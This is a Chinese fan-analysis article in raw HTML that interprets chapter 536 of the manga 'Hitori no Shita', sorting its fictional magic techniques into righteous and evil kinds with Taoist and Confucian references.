<br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><br></p>\n<h2><b>目录</b></h2>\n<p><b><i>引子</i></b></p>\n<p><b><i>邪</i></b></p>\n<p><i>影子法术</i></p>\n<p><i>野茅山</i></p>\n<p><i>纸人巫术</i></p>\n<p><i>拘灵遣将.服灵版</i></p>\n<p><b><i>正</i></b></p>\n<p><i>正一金光</i></p>\n<p><i>全真伍柳</i></p>\n<p><i>全真金丹</i></p>\n<p><i>圣光</i></p>\n<p><b><i>本欲</i></b></p>\n<p><i>四张狂</i></p>\n<p><i>三尸</i></p>\n<p><i>冯宝宝</i></p>\n<p><i>归根</i></p>\n<hr>\n<h2>引子</h2>\n<p>漫画536（569）话，提出了邪祟这一概念；其实虽然之前一人之下中提到过多次正邪不两立的概念，但多是道德层面上的，这次是第一次在一人之下的功法体系中将正邪区分开来；这一区分，其实也为之前一些法术定了性了；所以这里就从个人角度来简单说一下一人之下中的正法与邪法（存在主观臆测）</p>\n<p>先强调一下：即使功法分为正邪，但也不代表使用者的善恶；不然柳妍妍这种就很难定义了；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-92e444958fd2ec3128d2a6f9d0c2ab9c_720w.jpg?rss\" data-rawwidth=\"704\" data-rawheight=\"213\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-92e444958fd2ec3128d2a6f9d0c2ab9c\" data-watermark-src=\"v2-3623cbab469cf1f15fe92d998e1b1f85\" data-private-watermark-src=\"\"></p>\n<h2>邪</h2>\n<p>先来说正的对立面邪祟，其实金光咒之类的法咒的一大功能就是驱邪；只不过可能张楚岚此前没有接触到这方面的应用罢了；所以这次二叔也是借小师叔的口给我们补补课；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-71dda168be536f36c6e796c10b13c696_720w.jpg?rss\" data-rawwidth=\"707\" data-rawheight=\"165\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-71dda168be536f36c6e796c10b13c696\" data-watermark-src=\"v2-3c563ebc6c1fb9d643b22d23fde75f10\" data-private-watermark-src=\"v2-d64ddc4690a7b1cbb43e168ac6fde5b3\"></p>\n<p>从小师叔的话中我们也能看到，邪祟是个很广泛的概念，邪门法术，古代妖魔都可以定义为邪祟，而他们的共同点就是人性命中的“腐败”，这里有两个重点，一是针对性命，二是“腐败”的定义；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-25f263891fff58433803c8ca3b154211_720w.jpg?rss\" data-rawwidth=\"701\" data-rawheight=\"225\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-25f263891fff58433803c8ca3b154211\" data-watermark-src=\"v2-e7f1f21be8e2c541867c54613c755919\" data-private-watermark-src=\"\"></p>\n<p>陈撄宁说：“性即是吾人之灵觉，命即是吾人之生机。所以<b>性</b>一般指无形的生命，如神，心，本性；<b>命</b>一般是指有形的生命如精，气吐纳；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-306b920103a7c9e85a62516ceeb7144e_720w.jpg?rss\" data-rawwidth=\"1030\" data-rawheight=\"290\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-306b920103a7c9e85a62516ceeb7144e\" data-watermark-src=\"v2-b2a4b2fce59129867a4e3d2cef7565e5\" data-private-watermark-src=\"v2-0a7f77846d3ccca76929c650177f4f52\"></p>\n<p>而所谓的腐败应该就是指吸收或吞噬他人魂魄导致的灵魂不洁或是引导先天一炁走向了错误的地方（这里属于个人看法）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cdc8ce777632d065f54a617a11385ff2_720w.jpg?rss\" data-rawwidth=\"705\" data-rawheight=\"273\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cdc8ce777632d065f54a617a11385ff2\" data-watermark-src=\"v2-316f754cc39716622b81783e3ba9d9c5\" data-private-watermark-src=\"v2-45c501545e9be215a0d994a94f0d8280\"></p>\n<p>“若夫为不善，非才之罪也”，孟子也认为人有不善的行为，并不是人的本质不善。而是本性被腐败污染；这一点和漫画中张灵玉对邪祟诞生的原因评价如出一辙；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bcb7db4545aac0ce86be4a460969881b_720w.jpg?rss\" data-rawwidth=\"699\" data-rawheight=\"186\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bcb7db4545aac0ce86be4a460969881b\" data-watermark-src=\"v2-fb69a6e259da85bbf1ab1b39a4667689\" data-private-watermark-src=\"\"></p>\n<p>就像我们说的阴雷也是正气，自然界中的阴阳本就是相伴而生的一对范畴；不存在正邪对立的说法；而邪祟不同他是腐化了人的本性；人皆有羞恶，恭敬，是非，恻隐之心；这些都是我固有的；求则得之，舍则失之。失去正气难免落入不善之中（个人观点）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d1527c0238a6a31af241f8d8e45ee644_720w.jpg?rss\" data-rawwidth=\"681\" data-rawheight=\"196\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d1527c0238a6a31af241f8d8e45ee644\" data-watermark-src=\"v2-3696bda3d8f43e8195eaefb192cf2526\" data-private-watermark-src=\"\"></p>\n<p>下面列举一下漫画中从性命“腐败”这个角度来说可能属于邪祟的功法：</p>\n<p><b>影子法术</b></p>\n<p>漫画536（569）话，已经确定了影子法术来自大地之子（巫师公会）中莉莉娅会长的随行助理拉瑞；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-86547055c96aa28193a418882125528c_720w.jpg?rss\" data-rawwidth=\"702\" data-rawheight=\"175\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-86547055c96aa28193a418882125528c\" data-watermark-src=\"v2-1c4f2ff7a06d50cbea2c4c717326db5f\" data-private-watermark-src=\"\"></p>\n<p>在之前的漫画中拉瑞对影子法术的介绍是，行动时没有任何的声音，气味，甚至连抽象的情绪都没有，这些保留在施术者自身的本体上；影子里只有分裂出的一点灵魂罢了；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4724fbf040a1a5fec57fde0ea02789bd_720w.jpg?rss\" data-rawwidth=\"706\" data-rawheight=\"294\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4724fbf040a1a5fec57fde0ea02789bd\" data-watermark-src=\"v2-5e7fbe01b6a47fb4d451dcfb2d8bedf7\" data-private-watermark-src=\"\"></p>\n<p>肖哥不杀拉瑞有两个可能，一个是看出了拉瑞怀有苦衷，并非大奸大恶之人，不过画面中的拉瑞脸朝下躺尸，应该看不出来吧，另一可能就是身在公司还要复命交差；不方便做的太过出格；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4b6d181546fe71fb8ee3f66a1977085f_720w.jpg?rss\" data-rawwidth=\"703\" data-rawheight=\"213\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4b6d181546fe71fb8ee3f66a1977085f\" data-watermark-src=\"v2-58a9b6d7a2aa4c6a0a034bc3fd0d2032\" data-private-watermark-src=\"\"></p>\n<p><b>野茅山</b></p>\n<p>江湖散士借茅山派之名，集合了各种奇门法术，多以却邪治病为业；茅山道士多深居简出，所以茅山的出名，更多是因为冒用茅山名义的散人。现实中，人们有茅山道士多是捉鬼的印象，其实这一设定很多来自影视作品；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-30fcb0de6c909ae1d89e07cf2ac56689_720w.jpg?rss\" data-rawwidth=\"704\" data-rawheight=\"271\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-30fcb0de6c909ae1d89e07cf2ac56689\" data-watermark-src=\"v2-f04b5c053457cb45e7cc11f30c0d8c76\" data-private-watermark-src=\"\"></p>\n<p>有一说一，野茅山其实也是部分散人团体的一个集体名号，所以野茅山并非是恶人的标志；就像三十六贼中就有一个出自野茅山的王新海；野茅山的科目范围非常广，包括蛊术，符咒，巫术；当然相对主流的还是各种邪门巫术；不过野茅山虽然假茅山之命行事，但也并非全是作恶的，反而往往以为人驱邪治病的职能出现；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-621c027445810b1653dd4a6756481689_720w.jpg?rss\" data-rawwidth=\"692\" data-rawheight=\"260\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-621c027445810b1653dd4a6756481689\" data-watermark-src=\"v2-196766a66f891a5443c011e07575ea26\" data-private-watermark-src=\"\"></p>\n<p>详情：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://zhuanlan.zhihu.com/p/158537294\" data-size=\"small\" data-image=\"https://pic3.zhimg.com/v2-d2a95a586ddf04bf537d51f58660ee56_720w.jpg\" data-entity-type=\"article\" class=\"internal\">【一人之下】——龙套门派大全</a><p><b>七煞攒身</b></p>\n<p>七煞攒身需要七名八字合适的男童，通过杀死他们获得他们的灵魂，以此为修炼的基础将七个恶灵修炼成为自己护身的煞气；功夫到时可以将这些煞气如臂使指；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-de7d632c88ca481923ad59dbaf6f2d1b_720w.jpg?rss\" data-rawwidth=\"703\" data-rawheight=\"248\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-de7d632c88ca481923ad59dbaf6f2d1b\" data-watermark-src=\"v2-bdae261fdc45e68ec9c1cc4054038033\" data-private-watermark-src=\"\"></p>\n<p>赵归真为了修行七煞攒身杀死了七名无辜儿童，这其实已经完全符合了本话中张灵玉对邪祟的定义：一念成魔；融入他人灵魂作为自身气的来源的同时，本性的先天一炁也自然被污染；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-96585449d043e327284245551a43be19_720w.jpg?rss\" data-rawwidth=\"682\" data-rawheight=\"243\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-96585449d043e327284245551a43be19\" data-watermark-src=\"v2-9af7c03babcc36207b49970333733ee2\" data-private-watermark-src=\"\"></p>\n<p>备注：赵归真的掌中迷魂印属于手印范畴，虽然不算正道但也不属于邪祟；刘兄的换形钉也是同理；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3fb1117d491c175587159baefc927d4_720w.jpg?rss\" data-rawwidth=\"681\" data-rawheight=\"201\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f3fb1117d491c175587159baefc927d4\" data-watermark-src=\"v2-c84918bcecf4be9fb4e417dfe1aac008\" data-private-watermark-src=\"\"></p>\n<p><b>淫祀</b></p>\n<p>李巳是手游原创角色，野茅山道士，会使用分身术和用人体做祭品的淫祀；此外介绍中提到李巳还会使用部分符咒，他痴迷淫祀，表面礼貌实则内心是个变态；《礼记·曲礼》谓：“非其所祭而祭之，名曰淫祀。淫祀无福。”所谓的淫祀包含了越份之祭与未列入祀典之祭两种。从现在的眼光来看，其本身其实是古代封建统治阶级为了保证祭司与祈福的独占性设立的制度；不过手游中的淫祀以活人为祭，要更为邪恶；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-93f0777d4ea126d546d3c58a91490338_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"221\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>纸人巫术</b></p>\n<p>全性有个用纸人威胁龚庆的角色小苏（出自片尾配音表）；这与本话中出现的影子法术可谓是异曲同工；可能很多人不知道，传统剪纸这门艺术其实本身就是巫术用具，他的艺术性和价值更多在于他所包含的虔诚和信仰之中。楚巫文化催生了南方各民族的巫术剪纸，同时也影响了这一地区民间剪纸中神秘奇谲风格的剪纸巫术形成。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7828625230d5ee3508371340e6caa97d_720w.jpg?rss\" data-rawwidth=\"666\" data-rawheight=\"220\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7828625230d5ee3508371340e6caa97d\" data-watermark-src=\"v2-207654a4086ef048278c6a3e75900467\" data-private-watermark-src=\"\"></p>\n<p>红楼梦里的马道婆就曾今用纸人折磨过贾宝玉和王熙凤；她在写有宝玉和凤姐的生辰八字的纸人上，在几处指定的位置（即中医里的“玉堂穴”，处于人体要害部位的穴位）上贴上鬼脸，导致宝玉和凤姐先是头疼，既而发疯，最后奄奄一息，幸亏后来携通灵宝玉下凡的僧人作法，才将叔嫂二人救活过来。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e2ef6eae195ca81d8d3bbaaf7e2ed667_720w.jpg?rss\" data-rawwidth=\"705\" data-rawheight=\"252\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e2ef6eae195ca81d8d3bbaaf7e2ed667\" data-watermark-src=\"v2-17d9d0d9104940b23a7ff116aa50a735\" data-private-watermark-src=\"\"></p>\n<p>另外从手游人物档案中介绍的薛幡的人生来看，薛幡属于先天异人，而且他的恸哭应该也属于巫术的范畴之一；只不过薛幡本身与他人的灵魂能高度契合，所以有点与邪祟相似；在古代，丧葬是人一生的大事，有钱人家常会选择五官端正的孩子去扮做“孝子贤孙”代替他们担幡买水，一显家族昌盛,二显后人情真意切。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e8ee77f07883a2a172a2f92279a1c2c0_720w.jpg?rss\" data-rawwidth=\"666\" data-rawheight=\"243\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e8ee77f07883a2a172a2f92279a1c2c0\" data-watermark-src=\"v2-0d0b5b06197ac05b33f5c05f2c29b1d2\" data-private-watermark-src=\"\"></p>\n<p>再往上追述，哭坟是一种原始的沟通灵魂的手段，体现了古人希望与逝去亲人交流的愿望，一人之下中在全性哭坟小哥就是通过哭的方式召唤灵魂帮助自己，是现实中哭坟的具象化表现；</p>\n<p><b>拘灵遣将.服灵版</b></p>\n<p>综上所述，我们可以看出，本命灵魂与先天一炁二者的纯净性是区分正气与邪祟的一个比较重要的方式；如此我们就可以回到漫画124话在此来讨论一下服灵的定义了；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3b9630a1d802d5e5014b87caa75c215f_720w.jpg?rss\" data-rawwidth=\"667\" data-rawheight=\"180\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3b9630a1d802d5e5014b87caa75c215f\" data-watermark-src=\"v2-4e6d73e31157c783484e58498a31957d\" data-private-watermark-src=\"\"></p>\n<p>之前结合二叔在《九九八十一》中对服灵的定义，服灵之法，是一种吞噬精灵来全面提升宿主能力的巫术；副作用是会被世间所有精灵所厌恶（失去作为巫师的资格）；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f6c9f93b24f643100d6ecf66d020aedd_720w.jpg?rss\" data-rawwidth=\"685\" data-rawheight=\"259\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f6c9f93b24f643100d6ecf66d020aedd\" data-watermark-src=\"v2-906abb8ff6485ea4a6f6f8469697cf35\" data-private-watermark-src=\"\"></p>\n<p>在一人之下的世界中精灵和魂魄也是生命的一种形态，所以杀死他们融合他们的能力其实就是拘灵遣将版本的七煞攒身；通过和他人的魂魄融合永久获得他人的能力，其实另一方面也是在污染自己的本命与先天一炁；将自己的灵魂染为邪祟；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8572a19e6320c09a8a0c2290e8915f9b_720w.jpg?rss\" data-rawwidth=\"706\" data-rawheight=\"247\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8572a19e6320c09a8a0c2290e8915f9b\" data-watermark-src=\"v2-49baab53fe89df50231d24cccf8470b7\" data-private-watermark-src=\"\"></p>\n<p>详情：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://zhuanlan.zhihu.com/p/274146365\" data-size=\"small\" data-image=\"https://pic2.zhimg.com/v2-73e2163dc42c9c78cc65acdc6144a457_720w.jpg\" data-entity-type=\"article\" class=\"internal\">一人之下——天下会·企业档案</a><h2>正</h2>\n<p>既然有邪就有正，有“腐败”自然也有“纯净”张灵玉的金光和阿方索的圣光都能灼伤影子中的邪气；那自然具有与之相反的正气；那么何为正气呢？首先来看漫画中的定义：堂堂正正的生命之光；</p>\n<p>崆峒问答中老天师解释说：正气，养其自然而已。就像漫画中张灵玉对正的解释是：修习这门手段必定要做到身心端正；所谓养其自然而已。孟子认为正气是我们性命中带着的东西：人性之善也，犹水之就下也。所以人无有不善，水无有不下。回到漫画本身，正气就是我们自身原本的性命；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bdcf2edade7f00afac194c4e7cd9f132_720w.jpg?rss\" data-rawwidth=\"681\" data-rawheight=\"310\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bdcf2edade7f00afac194c4e7cd9f132\" data-watermark-src=\"v2-2e1f23a2cc6ada650cfd3bf5d64fda4b\" data-private-watermark-src=\"\"></p>\n<p>我知道对于正邪的定义古往今来有无数版本，但是漫画536（569）话，中张灵玉既然提到了生命之光，那不可避免的以下内容包括对拘灵遣将的新定义都会跟着这一观点来走；（以下仅个人观点）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e0b8558b37e0b8ac33e701fa1baa18c1_720w.jpg?rss\" data-rawwidth=\"704\" data-rawheight=\"241\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e0b8558b37e0b8ac33e701fa1baa18c1\" data-watermark-src=\"v2-86c0fa40a3d60302ff31bb23751b434f\" data-private-watermark-src=\"\"></p>\n<p>以下列举的只是符合漫画536（569）话中张灵玉提出的定义的门派与法术；所以三一门，佛家各派等名门正派也都未列入；</p>\n<p><b>正一金光</b></p>\n<p>漫画536（569）话，灵玉再次提到了自家金光和雷法中的驱邪属性；何谓正一？正者不邪，一者不杂。正一之心则万法归一，故曰正一。（出自《崆峒问答》）既然金光咒是堂堂正正的光，那什么是金光？天师曾说：唯体光明，心神虚白，是为金光正炁。从这一点来说漫画其实是比较还原的；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d4d1e93c93d45ce494e997c2aeb905d5_720w.jpg?rss\" data-rawwidth=\"681\" data-rawheight=\"280\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d4d1e93c93d45ce494e997c2aeb905d5\" data-watermark-src=\"v2-e555cd9ebf4461143d10de91d334c356\" data-private-watermark-src=\"\"></p>\n<p>对于金光咒以及其现实中的一些背景 ，我在之前的漫画527话中写到过，这里就不赘述了；</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/460536953/answer/1898408463\" data-image=\"https://pic3.zhimg.com/v2-cdb5d5b0b55bf37fa93f8cb8949aa325_bh.jpg\" data-image-width=\"1920\" data-image-height=\"929\" class=\"internal\">如何评价《一人之下》527（559）话？</a><p>这里偷偷纠正小师叔一个一直以来的看法（小师叔现在应该已经想明白一点了，但从通天箓上看可能心里还是有坎），阴雷诡谲，虽然不如阳雷堂堂正正；但阴雷也是正道；千峰老人说：“性者心也，发于二目，命者肾也，发于淫根；所以在修炼中虽然一般情况会优先提到从心肺方面入手的类型，但一般也会说：从肝肾入手其实也可以，自选其一就行；阴雷的形式其实只是他所代表的精气属性和形态的体现；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7e4e18b0e495f6174d16c7bac9ece69c_720w.jpg?rss\" data-rawwidth=\"704\" data-rawheight=\"268\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e4e18b0e495f6174d16c7bac9ece69c\" data-watermark-src=\"v2-dfdca82020fb788e3c595347725edfb7\" data-private-watermark-src=\"\"></p>\n<p>其实阴阳雷都是殊途同归的；回到少年张之维对性命的说法，这些其实都是清净自身温养本性的方法罢了；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-63bf66b32ca2630e207d25f656b5974d_720w.jpg?rss\" data-rawwidth=\"705\" data-rawheight=\"235\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-63bf66b32ca2630e207d25f656b5974d\" data-watermark-src=\"v2-9f6aa43295bef5a279ea334eec13f98b\" data-private-watermark-src=\"\"></p>\n<p><b>全真金丹</b></p>\n<p>既然本回漫画中灵玉真人已经提出人的性命本就蕴含正气，那么全真金丹的性命功夫自然也是在小师叔所说的堂堂正正的范畴之中的；那么何谓全真？不漏精气，以全我真。故曰全真。（出自《崆峒问答》）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bb38398d8f9b3424a0c75fa9020d43f6_720w.jpg?rss\" data-rawwidth=\"682\" data-rawheight=\"308\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bb38398d8f9b3424a0c75fa9020d43f6\" data-watermark-src=\"v2-1d7cf0edfd09b5ac2a3aeb92b9457324\" data-private-watermark-src=\"\"></p>\n<p>再稍微展开一点说，性命的腐败滋生邪祟，那相反的要养育正气；也就要修养性命；王重阳云：“性者神也，命者气也。”，全真内丹就是要强健二者。既追求完美的肉体又追求强健的灵魂，一人之下中的出阳神（元神出窍）就是元神修炼到足够强劲的表现。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d547272501b037706c60c11347c55207_720w.jpg?rss\" data-rawwidth=\"777\" data-rawheight=\"218\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d547272501b037706c60c11347c55207\" data-watermark-src=\"v2-a2d22717e1992c78aea1eb0dd6e5ad2a\" data-private-watermark-src=\"\"></p>\n<p><b>全真伍柳</b></p>\n<p>二壮所在的全真伍柳也是同理；伍柳派源自全真龙门派，以<b>柳华阳</b>为祖师；伍柳打破了宗教壁垒，融合佛道思想，追求慧命，粉碎虚空（听起来的确有点中二），即先天阳神遍布万物的境界，所以漫画中二壮的先天念力，受到后天<b>慧命</b>的激发，演变为了可以在网络世界游走的精神力。另外伍柳派的《仙佛合宗》中也提到了金光咒的修炼；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6486fbedfd40c80eaa360f23fb15fc1f_720w.jpg?rss\" data-rawwidth=\"682\" data-rawheight=\"340\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6486fbedfd40c80eaa360f23fb15fc1f\" data-watermark-src=\"v2-1859c9dcbecb9f018f3d930cd94c0e00\" data-private-watermark-src=\"\"></p>\n<p><b>圣光</b></p>\n<p>圣光一般出现在与月神太阳神有关的信仰或者传说中；不过阿方索是天主教徒的可能性比较高；同时在鲁那教派圣光也是其中的符号之一；不排除这是在纳森岛上阿方索通过教派之外的途径学习了将本身的白魔法实体化后的效果；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-68cc5e7ca01cd8bcfecf4a26400c310e_720w.jpg?rss\" data-rawwidth=\"685\" data-rawheight=\"237\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>很多传说甚至游戏中也会提到圣光能量，这有点类似于中国的金光咒，是象征一种阳光正面积极的能量；所以漫画中才会对污秽有克制作用；这里阿方索提到了黑暗这一词，那应该来说就是在指魔法中的黑和白；黑一般指污秽的有侵略性的魔法，而白一般指圣洁的有治愈性的魔法；和中国的阴阳概念相似；二者只是一对相对的范畴，不存在觉得的好与坏；毕竟黑白阴阳都是相对产生的概念；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c9e815dc5f5582eaeecfb28b48e4cbff_720w.jpg?rss\" data-rawwidth=\"664\" data-rawheight=\"256\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c9e815dc5f5582eaeecfb28b48e4cbff\" data-watermark-src=\"v2-ea84c83de12164f919253fa29d5f4fd7\" data-private-watermark-src=\"\"></p>\n<h2>本欲</h2>\n<p>漫画536（569）话中还提到，动物杀生是恶，但也是本能，这是他们的本能，没得选；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a1d9a6e2fedd2dc057a3d360e6427816_720w.jpg?rss\" data-rawwidth=\"679\" data-rawheight=\"204\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a1d9a6e2fedd2dc057a3d360e6427816\" data-watermark-src=\"v2-4a29d390087fcef65adbe4a5453b6e87\" data-private-watermark-src=\"\"></p>\n<p>就像王也说的：如果我喝水可能会伤害这个世界，难道我为了不伤害这个世界就不喝水了吗？这显然不可能；本欲是无法达成和解的，必然要做的事情；不需要同情，但也不能被鄙夷；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0640d37b81c536bcf88b6922075d3145_720w.jpg?rss\" data-rawwidth=\"681\" data-rawheight=\"184\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0640d37b81c536bcf88b6922075d3145\" data-watermark-src=\"v2-309c904dc354282b3b7c27dd9bb4b289\" data-private-watermark-src=\"\"></p>\n<p><b>四张狂</b></p>\n<p>所以四张狂属于邪祟吗？当然不属于，且不说除了沈冲二叔给其他人都设计了独特的剧情故事；单是回到四张狂的设定本身：酒是穿肠毒药，色是刮骨钢刀。财是惹祸根苗，气是雷烟火炮。酒色财气，几乎是人生必然遇到的诱惑，谓之四戒。饮酒不醉乃为高，好色不乱是英豪，不义之财君莫取，忍气吞声气自消。悖逆四戒，则为张狂；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9bce4014abb82131f8dd4aed62f3d688_720w.jpg?rss\" data-rawwidth=\"896\" data-rawheight=\"390\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9bce4014abb82131f8dd4aed62f3d688\" data-watermark-src=\"v2-92ed3236c606e4bff3fb3eecc9e4ad2a\" data-private-watermark-src=\"\"></p>\n<p>但反过来看，无酒不成礼仪,无色路断人稀,无财吞声忍气,无气反招人欺；酒色财气不是恶魔，而是我们生活的一部分，不要沉溺其中，但也不要视若虎豹，他们本就是人之本欲，理性看待他们就好；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e6ee1f83cfb2f707c7c2d381ee50d9bc_720w.jpg?rss\" data-rawwidth=\"719\" data-rawheight=\"218\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e6ee1f83cfb2f707c7c2d381ee50d9bc\" data-watermark-src=\"v2-beb1df2ee4650a6fa1290396bd02aa3f\" data-private-watermark-src=\"\"></p>\n<p>详情：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://zhuanlan.zhihu.com/p/185927572\" data-size=\"small\" data-image=\"https://pic4.zhimg.com/v2-90d28fdc71f8917008734159929ea84b_720w.jpg\" data-entity-type=\"article\" class=\"internal\">一人之下——全性·42人赞</a><p><b>三尸</b></p>\n<p>三魔或者叫三尸在这一点上和四张狂其实是一样的，三尸也不是什么邪祟；涂君房是三魔派唯一传人，而三魔派其实原本也不是邪门歪道；“三尸”，在道教指的是三尸神。尸者，神主之意。道教认为人体有上中下三个丹田，各有一神驻跸其内，统称“三尸”。上尸好华饰，中尸好滋味，下尸好淫欲，也有版本指代嗔贪痴。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3b8cfe07d0d7a6206cbf346f3b137d0c_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"193\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3b8cfe07d0d7a6206cbf346f3b137d0c\" data-watermark-src=\"v2-558b93cdc8e83c00029b09df49766aba\" data-private-watermark-src=\"\"></p>\n<p>早期道教认为斩“三尸”，恬淡无欲，神静性明，积众善，乃成仙。唐妙兴说消除三尸的要诀是一颗坚如磐石的心；当年在三星洞中，菩提祖师看重心猿的赤子之心，所以给了孙字作为姓氏（子系为孙），又因他所求长生，所以给他取名悟空；所谓：“孙悟空”，便是守赤子之姓（性），求悟空之名（命）；心猿坚固，道阻且长；一颗绝不动摇的恒心，就是消除三尸九虫的法宝；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d3e384f08090a39795a14bb79442e55d_720w.jpg?rss\" data-rawwidth=\"1032\" data-rawheight=\"571\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d3e384f08090a39795a14bb79442e55d\" data-watermark-src=\"v2-da8a2c28b09d8d8c3d713a09a0a6b5fd\" data-private-watermark-src=\"\"></p>\n<p>详情：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://zhuanlan.zhihu.com/p/269638593\" data-size=\"small\" data-image=\"https://pic3.zhimg.com/v2-bbf1973a8ab3ca5cd96c3e45caba9c33_720w.jpg\" data-entity-type=\"article\" class=\"internal\">一人之下——三魔派·白骨夫人</a><p><b>冯宝宝</b></p>\n<p>宝宝的情况其实更为特殊，对她而言，其实倒不存在所谓的的本欲；在宝儿姐第一次杀人时，虽然是第一次，但是宝儿姐依然眼疾手快，干净利落，究其原因，此时的宝儿姐其实尚不知生死为何物，我们经常说：未知生，焉知死？荀子曰：性者，本始材朴也。在法国精神分析学家拉康·雅克看来，6到18个月的婴孩还不能区分自己的镜像与他人的镜像；甚至不能区分自己与死物的区别，荀子曰：无性则伪之无所加，无伪则性不能自美。就像此时的宝儿姐这样，在不知生死的她看来，生死，不过是物品摆放的两种状态罢了，赵姨说要那些土匪去死，而这在这个阶段的宝宝看来，就像是让她把倒下的南瓜扶正一样，除了摆放方式不同了，其他的，并无什么两样；生亦何欢，死亦何惧？两手空空来，何处挟生死？宝宝不把这生死看重，自然不存在恶意，那恶灵也自然拿宝儿姐没有办法；</p>\n<p><img 